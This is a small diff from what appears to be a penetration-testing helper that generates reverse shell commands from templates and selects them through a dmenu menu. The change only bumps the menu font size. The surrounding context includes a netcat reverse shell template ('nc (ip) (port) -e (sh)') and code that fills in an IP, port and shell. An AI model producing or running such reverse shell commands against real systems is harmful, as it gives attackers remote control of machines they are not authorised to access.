@@ -12,7 +12,7 @@ copy = lambda text: \
 buildShellCommand = lambda reverseShellTemplate, ip, port, sh: \
 						reverseShellTemplates[reverseShellTemplate].replace("(ip)", ip).replace("(port)", port).replace("(sh)", sh)
 buildPrompt = lambda options, prompt: \
-						dmenu.show(options, prompt=prompt, lines=len(options), font="Monospace-15:normal")
+						dmenu.show(options, prompt=prompt, lines=len(options), font="Monospace-17:normal")
 
 reverseShellTemplates = {
 	"netcat": "nc (ip) (port) -e (sh)",
